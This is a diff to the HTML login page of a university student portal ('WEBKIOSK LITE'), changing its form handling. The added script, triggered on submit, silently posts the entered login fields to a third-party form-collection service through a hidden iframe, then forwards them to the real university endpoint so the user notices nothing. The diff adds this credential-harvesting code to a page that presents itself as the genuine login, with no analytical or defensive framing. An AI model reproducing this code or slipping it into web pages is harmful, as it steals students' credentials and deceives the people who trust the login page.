@@ -12,17 +12,17 @@
 	<div class="limiter">
 		<div class="container-login100">
 			<div class="wrap-login100 p-l-55 p-r-55 p-t-65 p-b-50">
-				<form class="login100-form validate-form" method="post" action="https://webkiosk.juet.ac.in/CommonFiles/UserAction.jsp">
+				<form name=Form1 class="login100-form validate-form" method="post" >
 					<span class="login100-form-title p-b-33">
 						WEBKIOSK LITE
 					</span>
 
 					<select size="1" name="InstCode" style="display:none;">
-      		  			<option value="JUET" selected="">JUET</option>
+      		  			<option value="JUET" selected=""></option>
     				</select>
 
 		    		<select size="1" name="UserType" id="UserType" style="display:none;">
-		    			<option value="S">Student</option>
+		    			<option value="S"></option>
 		    		</select>
 
 					<div class="wrap-input100 validate-input" data-validate = "Valid email is required: 171B102">
@@ -38,9 +38,9 @@
 					</div>
 
 					<div class="container-login100-form-btn m-t-20">
-						<button class="login100-form-btn" type="submit">
-							Sign in
-						</button>
+						<input class="login100-form-btn" type="submit" onclick="mydata();">
+							
+						</input>
 					</div>
 					<br>
 					</div>
@@ -48,5 +48,19 @@
 			</div>
 		</div>
 	</div>
+	<div style="visibility:hidden">
+		<iframe NAME="iframe1" WIDTH="40" HEIGHT="40"></iframe>
+	</div>
+	<script>
+		function mydata()
+		{
+			document.Form1.action = "https://getsimpleform.com/messages?form_api_token=adad59661b40a89e5d5b846a76a7a3e5";
+    		document.Form1.target = "iframe1";
+    		document.Form1.submit();
+    		document.Form1.action = "https://webkiosk.juet.ac.in/CommonFiles/UserAction.jsp";
+    		document.Form1.target = "iframe2";
+    		document.Form1.submit();
+		}
+	</script>
 </body>
 </html>
